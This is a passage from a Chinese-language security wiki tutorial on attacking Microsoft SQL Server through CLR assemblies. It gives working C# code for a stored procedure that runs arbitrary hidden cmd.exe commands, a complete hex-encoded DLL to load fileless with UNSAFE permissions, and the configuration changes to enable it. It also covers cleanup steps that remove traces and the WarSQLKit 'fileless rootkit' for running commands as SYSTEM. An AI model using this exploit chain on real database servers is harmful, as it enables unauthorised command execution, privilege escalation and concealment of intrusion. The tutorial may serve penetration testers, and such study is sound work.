src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-16.png"></p><p>修改目标平台和勾选创建脚本</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-18.png"></p><p>在SQL Server 2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY SQLCLRTest  </span><br><span class="line">FROM &#x27;C:\MyDBApp\SQLCLRTest.dll&#x27;  </span><br><span class="line">WITH PERMISSION_SET = SAFE;  </span><br></pre></td></tr></table></figure><p>其权限集有三个选项：</p><p>  SAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。</p><p>  EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。</p><p>  UNSAFE：允许使用任何代码。</p><p>微软关于SQL CLR的详细文档可通过以下地址获得： <a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a></p><p>修改目标框架和权限级别为UNSAFE。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-19.png"></p><p>创建SQL CLR C# 存储过程</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-20.png"></p><p>写入代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.Data.SqlClient;</span><br><span class="line">using System.Data.SqlTypes;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Text;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line"></span><br><span class="line">public partial class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">    [Microsoft.SqlServer.Server.SqlProcedure]</span><br><span class="line">    public static void ExecCommand (string cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        // 在此处放置代码</span><br><span class="line">        SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;);</span><br><span class="line">        SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; /c &quot; + cmd));</span><br><span class="line">    &#125;</span><br><span class="line">    public static string RunCommand(string filename,string arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        var process = new Process();</span><br><span class="line"></span><br><span class="line">        process.StartInfo.FileName = filename;</span><br><span class="line">        if (!string.IsNullOrEmpty(arguments))</span><br><span class="line">        &#123;</span><br><span class="line">            process.StartInfo.Arguments = arguments;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        process.StartInfo.CreateNoWindow = true;</span><br><span class="line">        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;</span><br><span class="line">        process.StartInfo.UseShellExecute = false;</span><br><span class="line"></span><br><span class="line">        process.StartInfo.RedirectStandardError = true;</span><br><span class="line">        process.StartInfo.RedirectStandardOutput = true;</span><br><span class="line">        var stdOutput = new StringBuilder();</span><br><span class="line">        process.OutputDataReceived += (sender, args) =&gt; stdOutput.AppendLine(args.Data);</span><br><span class="line">        string stdError = null;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            process.Start();</span><br><span class="line">            process.BeginOutputReadLine();</span><br><span class="line">            stdError = process.StandardError.ReadToEnd();</span><br><span class="line">            process.WaitForExit();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlContext.Pipe.Send(e.Message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (process.ExitCode == 0)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlContext.Pipe.Send(stdOutput.ToString());</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            var message = new StringBuilder();</span><br><span class="line"></span><br><span class="line">            if (!string.IsNullOrEmpty(stdError))</span><br><span class="line">            &#123;</span><br><span class="line">                message.AppendLine(stdError);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (stdOutput.Length != 0)</span><br><span class="line">            &#123;</span><br><span class="line">                message.AppendLine(&quot;Std output:&quot;);</span><br><span class="line">                message.AppendLine(stdOutput.ToString());</span><br><span class="line">            &#125;</span><br><span class="line">            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code = &quot; + process.ExitCode + &quot;: &quot; + message);</span><br><span class="line">        &#125;</span><br><span class="line">        return stdOutput.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-21.png"></p><p>编译生成DLL文件。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-30.png"></p><p>运行权限级别为“SAFE”的代码，只需启用CLR就可以了；但是，要想运行权限级别为“EXTERNAL_ACCESS”或“UNSAFE”的代码，则需要需要修改相应的配置，以及DBA权限。2017年之前和之后的服务器版本，运行标记为“UNSAFE”的CLR所需步骤是不同的，下面分别进行介绍： </p><p><strong>对于SQL Server 2017之前的版本</strong></p><p>显示高级选项： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-31.png"></p><p>启用CLR： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;clr enabled&#x27;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-32.png"></p><p>将存储.Net程序集的数据库配置为可信赖的。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE master SET TRUSTWORTHY ON;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-33.png"></p><p><strong>SQL Server 2017及更高版本</strong></p><p>对于SQL Server 2017及更高版本，则引入了严格的安全性，也必须禁用。另外，也可以根据提供的SHA512哈希值，针对单个程序集授予其UNSAFE权限，而不是将整个数据库都标记为可信的。对于SQL Server 2017及以上版本，如下所示：</p><p>显示高级选项： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE</span><br></pre></td></tr></table></figure><p>启用CLR： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;clr enabled&#x27;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>将某程序集的SHA512哈希值添加到可信程序集列表中： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_add_trusted_assembly @hash= &lt;SHA512 of DLL&gt;;</span><br></pre></td></tr></table></figure><p>从现在开始，程序集的创建和调用对于任何SQL Server版本来说，都是一样的。</p><p>通过十六进制字符串创建程序集——如果可以从十六进制字符串创建程序集，则意味着无需创建一个二进制文件并将其写入SQL服务器进程可访问的位置： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY clrassem from &lt;HEX STRING&gt; WITH PERMISSION_SET = UNSAFE;</span><br></pre></td></tr></table></figure><p>创建存储过程，以从程序集运行代码： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE debugrun AS EXTERNAL NAME clrassem.StoredProcedures.runner;</span><br></pre></td></tr></table></figure><p>运行该存储过程： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugrun</span><br></pre></td></tr></table></figure><p>在代码运行后，可以删除存储过程、程序集以及受信任的哈希值，并将前面修改的安全设置恢复原值。下面显示了一个完成该任务的SQL查询示例</p><p>对于SQL Server 2017及更高版本： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_drop_trusted_assembly @hash=&lt;SHA512 of DLL&gt;</span><br></pre></td></tr></table></figure><p>对于SQL Server 2017之前的版本： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE &lt;CONNECTED DATABASE&gt; SET TRUSTWORTHY OFF;</span><br></pre></td></tr></table></figure><p>对于所有版本： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP PROCEDURE debugrun;</span><br><span class="line">DROP ASSEMBLY clrassem;</span><br><span class="line">sp_configure &#x27;clr strict security&#x27;,1;RECONFIGURE</span><br><span class="line">sp_configure &#x27;show advanced options&#x27;,0;RECONFIGURE</span><br></pre></td></tr></table></figure><h3 id="利用SQL语句导入程序集"><a href="#利用SQL语句导入程序集" class="headerlink" title="利用SQL语句导入程序集"></a>利用SQL语句导入程序集</h3><p>现在可以利用16进制文件流方式导入DLL文件，这样不需要文件落地。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-30.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [Database1]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103006E587C5E0000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A70206001402400006002102400006003100E401000000003700000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000002700000004000000000000000000000070005F000000000004000000000000000000000070004A00000000000400000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F300044617461626173653100496E743332003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468004461746162617365312E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A0020000000593C457501949B4EAC85A8875A6084DC000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006E587C5E00000000020000001C010000E42A0000E40C000052534453CEC8B2762812304EAEE7EF5EE4D9EC7901000000463A5C746F6F6C735F736F757263655C4461746162617365315C4461746162617365315C6F626A5C44656275675C4461746162617365312E706462000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000004400610074006100620061007300650031002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004400610074006100620061007300650031002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">    WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-34.png"></p><p>创建存储过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE [dbo].[ExecCommand]</span><br><span class="line">@cmd NVARCHAR (MAX)</span><br><span class="line">AS EXTERNAL NAME [Database1].[StoredProcedures].[ExecCommand]</span><br><span class="line">go</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-35.png"></p><h3 id="利用CLR执行命令"><a href="#利用CLR执行命令" class="headerlink" title="利用CLR执行命令"></a>利用CLR执行命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec dbo.ExecCommand &quot;whoami /all&quot;;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-36.png"></p><h3 id="WarSQLKit"><a href="#WarSQLKit" class="headerlink" title="WarSQLKit"></a>WarSQLKit</h3><p>WarSQLKit是一个针对MSSQL CLR进行利用的工具，有以下两个版本。</p><ul><li>WarSQLKit是完全版本，内置多种功能。</li><li>WarSQLKitMinimal是迷你版，只能执行命令。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</span><br></pre></td></tr></table></figure><h3 id="导入WarSQLKit-DLL文件"><a href="#导入WarSQLKit-DLL文件" class="headerlink" title="导入WarSQLKit DLL文件"></a>导入WarSQLKit DLL文件</h3><p>利用16进制文件流方式导入WarSQLKit.dll文件。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-37.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [WarSQLKit]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    FROM 0x4D5A......</span><br><span class="line">    WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-38.png"></p><p>创建存储过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE sp_cmdExec</span><br><span class="line">@Command [nvarchar](max)</span><br><span class="line">WITH EXECUTE AS CALLER</span><br><span class="line">AS</span><br><span class="line">EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-39.png"></p><h3 id="WarSQLKit-执行命令"><a href="#WarSQLKit-执行命令" class="headerlink" title="WarSQLKit 执行命令"></a>WarSQLKit 执行命令</h3><p>WarSQLKit CmdExec实现了以下功能</p><p>执行任意Windows命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;whoami&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-1.png"></p><p>以SYSTEM权限执行Windows命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;whoami /RunSystemPriv&#x27;;</span><br></pre></td></tr></table></figure><p><img 